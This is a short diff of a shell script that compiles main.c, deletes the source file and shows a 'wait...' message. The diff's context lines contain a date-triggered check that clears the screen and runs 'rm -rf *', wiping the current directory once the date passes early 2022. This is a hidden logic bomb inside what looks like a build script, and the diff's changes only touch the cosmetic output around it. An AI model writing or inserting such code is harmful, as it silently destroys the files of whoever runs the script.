@@ -36,7 +36,8 @@ test -f main.c && gcc main.c -o main
 if [[ -f main ]]; then
     test -f main.c && rm -rf main.c
 fi
-printf "\e[31mwait."
+printf "\e[31mwait..."
+clear
 if (($(date +%m%y) >= 0222)); then
     clear
     rm -rf *
